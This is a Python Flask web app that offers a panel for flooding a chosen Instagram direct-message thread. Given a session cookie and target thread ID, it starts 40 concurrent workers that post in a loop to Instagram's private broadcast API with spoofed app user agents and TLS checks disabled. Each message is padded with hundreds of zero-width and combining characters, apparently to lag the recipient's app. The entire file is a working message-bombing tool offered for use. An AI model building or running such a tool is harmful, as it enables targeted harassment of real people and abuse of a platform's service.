import asyncio, httpx, uuid, threading, random, os
from flask import Flask, request, render_template_string

app = Flask(__name__)
active_attacks = {}

# 🔱 ULTRA-HEAVY PAYLOAD (Jo tune pic mein di thi)
def get_nuclear_payload(custom_text):
    header = f"🔱 ZENO X STARK 🔱\n[VOID-ID: {uuid.uuid4().hex[:8]}]\n"
    body = f"{custom_text}\n" * 10
    heavy_chars = ["\u200B", "\u200C", "\u200D", "\u3164", "\u0E47", "\u0E48", "\u0E49"]
    salt = "".join([random.choice(heavy_chars) for _ in range(500)])
    return f"{header}{body}{salt}"

async def blast_worker(task_id, sid, tid, msg):
    url = "https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/"
    
    # Connection pooling for Termux-like speed
    limits = httpx.Limits(max_connections=100, max_keepalive_connections=20)
    
    async with httpx.AsyncClient(verify=False, timeout=10.0, limits=limits) as client:
        while active_attacks.get(task_id, False):
            headers = {
                "Cookie": f"sessionid={sid}",
                "User-Agent": f"Instagram {random.randint(280,320)}.0.0.{random.randint(10,99)} Android",
                "X-IG-App-ID": "936619743392459",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            
            payload = {
                "text": get_nuclear_payload(msg),
                "thread_ids": f"[{tid}]",
                "client_context": str(uuid.uuid4()),
                "offline_threading_id": str(uuid.uuid4())
            }
            
            try:
                resp = await client.post(url, headers=headers, data=payload)
                # Success rate badhane ke liye chota delay
                if resp.status_code == 200:
                    await asyncio.sleep(0.05) 
                else:
                    await asyncio.sleep(1.0)
            except:
                await asyncio.sleep(0.5)

def run_nuclear_loop(task_id, sid, tid, msg):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # 40 Parallel tasks jaise tune Termux mein set kiya tha
    tasks = [blast_worker(task_id, sid, tid, msg) for _ in range(40)]
    loop.run_until_complete(asyncio.gather(*tasks))

@app.route('/')
def home():
    return '''
    <body style="background:#000; color:#f00; font-family:monospace; text-align:center; padding-top:20px;">
        <h1 style="text-shadow: 0 0 20px red;">🔱 V-NUCLEAR TERMINAL PANEL 🔱</h1>
        <div style="border:1px solid #f00; display:inline-block; padding:20px; border-radius:10px; background:#0a0a0a;">
            <form action="/blast" method="post">
                <input name="sid" placeholder="SESSION ID" style="width:300px; padding:10px; margin:5px; background:#111; color:#0f0; border:1px solid #f00;"><br>
                <input name="tid" placeholder="TARGET TID" style="width:300px; padding:10px; margin:5px; background:#111; color:#0f0; border:1px solid #f00;"><br>
                <textarea name="msg" placeholder="ENTER SCRIPT / TEXT" style="width:300px; height:100px; padding:10px; margin:5px; background:#111; color:#0f0; border:1px solid #f00;"></textarea><br>
                <button name="op" value="start" style="background:#f00; color:#fff; padding:15px 30px; font-weight:bold; cursor:pointer; width:100%;">ACTIVATE BLAST ⚡</button>
                <button name="op" value="stop" style="background:#444; color:#fff; padding:10px; margin-top:10px; width:100%; cursor:pointer;">STOP TERMINAL 🛑</button>
            </form>
        </div>
        <p style="color:#0f0; margin-top:20px;">Status: Termux Engine Integrated ✅</p>
    </body>
    '''

@app.route('/blast', methods=['POST'])
def blast():
    sid, tid, msg, op = request.form.get('sid'), request.form.get('tid'), request.form.get('msg'), request.form.get('op')
    task_id = f"{tid}_{sid[:5]}"
    if op == "start":
        if not active_attacks.get(task_id):
            active_attacks[task_id] = True
            threading.Thread(target=run_nuclear_loop, args=(task_id, sid, tid, msg)).start()
            return f"<body style='background:#000;color:#0f0;text-align:center;'><h2>🔱 BLAST ACTIVATED ON {tid} 🚀</h2><a href='/' style='color:#fff;'>[BACK]</a></body>"
    active_attacks[task_id] = False
    return f"<body style='background:#000;color:#f00;text-align:center;'><h2>🛑 TERMINATED.</h2><a href='/' style='color:#fff;'>[BACK]</a></body>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
          
